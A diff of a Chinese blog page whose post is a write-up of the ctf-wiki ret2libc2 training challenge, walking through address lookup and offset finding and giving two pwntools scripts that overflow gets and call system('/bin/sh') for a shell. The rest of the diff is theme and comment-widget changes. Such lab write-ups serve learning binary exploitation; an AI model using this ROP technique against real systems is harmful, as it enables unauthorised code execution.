@@ -22,7 +22,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/green/pace-theme-minimal.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.1","exturl":false,"sidebar":{"position":"left","width":350,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="T4 ret2libc2 2023-01-09WPctf-wiki 基础rop">
 <meta property="og:type" content="article">
@@ -60,10 +60,11 @@
 
 
 
-
+<link rel="dns-prefetch" href="waline-server-pearl.vercel.app">
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
   </noscript>
+<link rel="alternate" href="/atom.xml" title="lmarch2'blog" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
@@ -151,7 +152,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T4 ret2libc2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#t4-ret2libc2"><span class="nav-text">T4 ret2libc2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -238,6 +239,7 @@
     </div>
         </div>
       </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=9232910433&auto=1&height=430"></iframe>
     </div>
 
     
@@ -273,6 +275,8 @@
       </ul>
     </div>
 
+        <div class="pjax">
+        </div>
   </aside>
 
 
@@ -345,6 +349,20 @@
       <span class="post-meta-item-text">阅读次数：</span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/posts/31eee638/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/posts/31eee638/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
     <span class="post-meta-break"></span>
     <span class="post-meta-item" title="本文字数">
       <span class="post-meta-item-icon">
@@ -369,17 +387,17 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2><span id="t4-ret2libc2">T4 ret2libc2</span></h2><blockquote>
+        <h2 id="t4-ret2libc2"><a href="#T4-ret2libc2" class="headerlink" title="T4 ret2libc2"></a>T4 ret2libc2</h2><blockquote>
 <p>2023-01-09WP<br>ctf-wiki 基础rop</p>
 </blockquote>
 <span id="more"></span>
 
-<h3><span id="0x01">0x01</span></h3><p>file checksec——32-bit，开启NX</p>
-<h3><span id="0x02">0x02</span></h3><p>拖入IDA看看<br>危险函数和ret2libc1相同都是gets<br>不同的是这次没有&#x2F;bin&#x2F;sh给我们用了<del>我还找了好久来着……</del><br>但是system函数还是有的<br>那我们先找出system的地址0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来<br>由于程序已经开启NX保护，我们无法直接写入栈<br>所以思考在bss段写入字符串  说实话，这个地方第一次看真的怎么都想不到……<br>然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……<br>最后我直接在IDA里快捷键G了一下跳到了.bss段<br>发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>去找gets的地址  得到0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
-<h3><span id="0x03">0x03</span></h3><p>用gdb暴力求出偏移量<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>终于可以写exp了</p>
-<h3><span id="0x04">0x04</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#先覆盖溢出，返回gets函数的地址，</span><br><span class="line">#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>拖入IDA看看<br>危险函数和ret2libc1相同都是gets<br>不同的是这次没有&#x2F;bin&#x2F;sh给我们用了<del>我还找了好久来着……</del><br>但是system函数还是有的<br>那我们先找出system的地址0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来<br>由于程序已经开启NX保护，我们无法直接写入栈<br>所以思考在bss段写入字符串  说实话，这个地方第一次看真的怎么都想不到……<br>然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……<br>最后我直接在IDA里快捷键G了一下跳到了.bss段<br>发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>去找gets的地址  得到0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb暴力求出偏移量<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>终于可以写exp了</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#先覆盖溢出，返回gets函数的地址，</span><br><span class="line">#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>这篇<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53357764#:~:text=%E5%85%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%EF%BC%9A%20payload%20%3D%20flat%20%28%5B%27a%27%20%2A%20112%2C%20gets_plt%2C,buf2%2C%20system_plt%2C%200xabcdabcd%2C%20buf2%5D%29%20%E7%9B%B8%E4%BF%A1%E6%9C%89%E7%9A%84%E6%9C%8B%E5%8F%8B%E4%BC%9A%E4%B8%8D%E6%98%8E%E7%99%BD%EF%BC%8C%E4%B8%BA%E5%95%A5%E6%9C%89%E4%B8%AA%20%5Bgets_plt%2C%20pop_ebp%2C%20buf2%5D%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84payload%E5%B8%83%E7%BD%AE%E3%80%82">文章</a>和这篇<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4928e726a43f">博客</a>挺不错的<br>还有<a target="_blank" rel="noopener" href="https://blog.csdn.net/ATFWUS/article/details/104565483">这篇</a></p>
-<h3><span id="0x05">0x05</span></h3><p>ctf-wiki的exp是</p>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>ctf-wiki的exp是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>[‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？<br>好像看到有博客说是为了堆栈平衡<br>其实就是用了两个gadget<br>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system</p>
 
@@ -569,6 +587,7 @@
 
 
 
+    <div class="comments" id="waline"></div>
 </div>
   </main>
 
@@ -682,8 +701,9 @@
 
   
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
 <script src="/js/third-party/search/local-search.js"></script>
@@ -696,17 +716,29 @@
   <script src="/js/third-party/pace.js"></script>
 
   
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
-
-</body>
-</html>
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-pearl.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"请文明评论呀","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/posts/31eee638/"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
+});
+</script>
 
 //Aplayer播放器
 <link rel="stylesheet" href="/dist/APlayer.css">
 <div id="aplayer"></div>
 <script type="text/javascript" src="/dist/APlayer.min.js"></script>
 <script type="text/javascript" src="/dist/music.js"></script>
+
+</body>
+</html>
+
